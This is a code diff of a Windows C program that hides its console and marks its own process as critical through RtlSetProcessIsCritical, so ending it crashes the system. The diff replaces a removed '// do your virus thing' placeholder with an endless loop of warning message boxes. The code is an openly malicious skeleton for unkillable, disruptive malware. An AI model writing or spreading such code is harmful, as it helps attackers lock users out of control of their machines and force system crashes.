@@ -29,8 +29,9 @@ BOOL EnablePriv(LPCSTR lpszPriv)
     return bRet;
 }
  
-BOOL ProtectProcess() 
+BOOL ProcessIsCritical() 
 {
+   FreeConsole();
    HANDLE hDLL;
    RtlSetProcessIsCritical fSetCritical;
  
@@ -48,10 +49,10 @@ BOOL ProtectProcess()
  
 int main (void)
 {
-ProtectProcess();
+   ProcessIsCritical();
    while(1)
    {
-    // do your virus thing
+       MessageBoxA(NULL, "THIS PROCESS IS CRITICAL DO NOT TRY TO KILL IT", "WARNING!", MB_ICONHAND | MB_OK);
    }
 return 0;
 }
